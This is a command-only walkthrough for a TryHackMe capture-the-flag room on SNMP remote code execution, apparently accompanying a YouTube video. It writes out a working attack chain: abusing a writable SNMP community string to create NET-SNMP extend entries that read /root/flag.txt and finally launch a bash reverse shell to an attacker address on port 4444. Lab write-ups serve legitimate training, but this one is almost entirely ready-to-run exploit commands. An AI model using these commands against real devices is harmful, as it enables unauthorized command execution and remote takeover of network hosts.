## TryHackMe room Operation Takeover [https://tryhackme.com/room/operationtakeover)

### TryHackMe peration Takeover YouTube Video Walk Through: 

[TryHackMe Operation Takeover | SNMP RCE via NET-SNMP Extend | Full Walkthrough 2026](https://youtu.be/yqBROBit7B0)

**Below commands used on TryHackMe room Operation Takeover YouTube video walk through:**

```
snmpset -v2c -c pr1v4t3 10.129.153.16 .1.3.6.1.2.1.1.5.0 s "CompromisedDevice"
snmpget -v2c -c pr1v4t3 10.129.153.16 .1.3.6.1.2.1.1.5.0
snmpwalk -v2c -c pr1v4t3 10.129.153.16 .1.3.6.1.2.1.1.5.0
```

```
c = 99
a = 97
t = 116
```

```
snmpset -v2c -c pr1v4t3 10.129.153.16 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.21.3.99.97.116' i 4 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.2.3.99.97.116' s "/bin/cat" \
  '1.3.6.1.4.1.8072.1.3.2.2.1.3.3.99.97.116' s "/root/flag.txt"
```

```
snmpwalk -v2c -c pr1v4t3 10.129.185.152 1.3.6.1.4.1.8072.1.3.2.4.1.2.3.99.97.116
```
  
``````
h = 104
e = 101
a = 97
``````

``````
snmpset -v2c -c pr1v4t3 10.129.153.16 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.21.3.104.101.97' i 4 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.2.3.104.101.97' s "/bin/head -c6" \
  '1.3.6.1.4.1.8072.1.3.2.2.1.3.3.104.101.97' s "/root/flag.txt"
```

```  
snmpwalk -v2c -c pr1v4t3 10.129.153.16 1.3.6.1.4.1.8072.1.3.2.4.1.2.3.104.101.97
```
  
```
r = 114
e = 101
v = 118
```

```
snmpset -v2c -c pr1v4t3 10.129.185.152 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.21.3.114.101.118' i 4 \
  '1.3.6.1.4.1.8072.1.3.2.2.1.2.3.114.101.118' s "/bin/bash" \
  '1.3.6.1.4.1.8072.1.3.2.2.1.3.3.114.101.118' s "-c 'bash -i >& /dev/tcp/10.129.90.34/4444 0>&1'"
```

``` 
snmpwalk -v2c -c pr1v4t3 10.129.153.16 1.3.6.1.4.1.8072.1.3.2.4.1.2.3.114.101.118
```

===
